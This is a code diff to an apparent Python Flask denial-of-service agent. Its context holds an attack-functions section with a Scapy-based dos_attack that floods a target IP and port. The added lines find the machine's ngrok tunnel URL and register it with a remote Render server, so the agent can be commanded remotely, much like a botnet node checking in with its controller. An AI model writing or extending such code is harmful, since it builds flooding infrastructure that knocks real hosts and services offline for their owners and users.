@@ -9,6 +9,32 @@ active_attacks = {}
 # -------------------------------
 # ATTACK FUNCTIONS
 # -------------------------------
+import requests
+
+RENDER_URL = "https://your-render-app.onrender.com"
+
+def register_with_server(ngrok_url):
+    try:
+        requests.post(f"{RENDER_URL}/agent/register", json={
+            "url": ngrok_url
+        })
+        print("✅ Registered with server:", ngrok_url)
+    except Exception as e:
+        print("❌ Registration failed:", e)
+
+def get_ngrok_url():
+    try:
+        res = requests.get("http://127.0.0.1:4040/api/tunnels")
+        tunnels = res.json()["tunnels"]
+
+        for t in tunnels:
+            if t["proto"] == "https":
+                return t["public_url"]
+
+    except Exception as e:
+        print("Error getting ngrok URL:", e)
+
+    return None
 
 def dos_attack(attack_id, target_ip, target_port, duration, rate):
     packet = IP(dst=target_ip)/TCP(dport=target_port)
@@ -75,4 +101,19 @@ def status(attack_id):
 
 # -------------------------------
 if __name__ == "__main__":
+
+    ngrok_url = None
+
+    # wait until ngrok is ready
+    for _ in range(10):
+        ngrok_url = get_ngrok_url()
+        if ngrok_url:
+            break
+        time.sleep(2)
+
+    if ngrok_url:
+        register_with_server(ngrok_url)
+    else:
+        print("❌ Could not detect ngrok URL")
+
     app.run(host="0.0.0.0", port=5001)
